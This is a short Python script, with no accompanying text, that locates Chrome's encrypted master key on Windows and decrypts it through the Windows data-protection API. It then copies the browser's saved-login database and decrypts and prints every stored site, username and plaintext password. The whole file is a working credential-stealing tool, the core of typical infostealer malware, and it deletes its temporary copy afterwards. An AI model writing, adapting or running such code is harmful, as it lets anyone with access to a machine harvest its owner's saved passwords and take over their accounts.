import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key():
 local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
 if not os.path.exists(local_state_path): return None
 with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.loads(f.read())
 key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
 return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
 try: return AES.new(key, AES.MODE_GCM, password[3:15]).decrypt(password[15:])[:-16].decode()
 except: return ""

def main():
 key = get_encryption_key()
 if not key: return
 db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
 filename = "ChromeData.db"
 shutil.copyfile(db_path, filename)
 db = sqlite3.connect(filename)
 cursor = db.cursor()
 cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_created")
 for row in cursor.fetchall():
  if row[2] and row[3]:
   decrypted = decrypt_password(row[3], key)
   if decrypted: print(f"Site: {row[0]}\nUser: {row[2]}\nPass: {decrypted}\n" + "-" * 50)
 cursor.close()
 db.close()
 try: os.remove(filename)
 except: pass

if __name__ == "__main__":
 main()
